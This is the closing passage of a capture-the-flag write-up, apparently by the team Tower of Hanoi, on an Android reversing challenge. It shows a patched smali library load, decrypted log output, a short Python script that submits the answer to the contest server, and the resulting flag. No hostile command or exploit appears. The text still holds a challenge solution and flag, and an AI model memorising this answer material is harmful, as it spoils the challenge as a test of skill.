<span class="line"><span>const-string v0, "/data/data/com.example.misc500adventure/app_LevelSO/liblevel03.so"</span></span>
<span class="line"><span>invoke-static {v0}, Ljava/lang/System;->load(Ljava/lang/String;)V</span></span>
<span class="line"><span></span></span></code></pre>
<p>Let’s copy the patched APK and the <code>.so</code> library and run the app.</p>
<p>Let’s check the logcat using <code>adb logcat</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>D TODO    : Bob I think you forgot to add the path to the native library!</span></span>
<span class="line"><span>D MyLib   : ThisIs_MagicBook</span></span>
<span class="line"><span>D MyLib   : ޏs�1�&#x26;���lr�ThisIs_MagicBook</span></span>
<span class="line"><span>D MyLib   : </span></span>
<span class="line"><span>D MyLib   : CBC decrypt: </span></span>
<span class="line"><span>D MyLib   : Avada KedavraThisIs_MagicBook</span></span>
<span class="line"><span>I System.out: Avada Kedavra</span></span>
<span class="line"><span></span></span></code></pre>
<p>Here it is, our decrypted answer. Let’s send it to the server.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> requests</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">level</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    r </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> requests</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/ab396cd2b1d8a7d4fb5c1e137224004a0261976d</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">        json</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> level</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">},</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">json</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelEnding</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Avada Kedavra_CorrectAnswer!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<p>Finally, we got the flag.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#666666">{</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">None</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">{FLG</span><span style="color:#CB7676">:</span><span style="color:#C99076">wh4t_a_h4ppY_3nd1ng_dud3!}</span><span style="color:#C98A7D77">'</span><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2024 Tower of Hanoi. All rights reserved.
<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>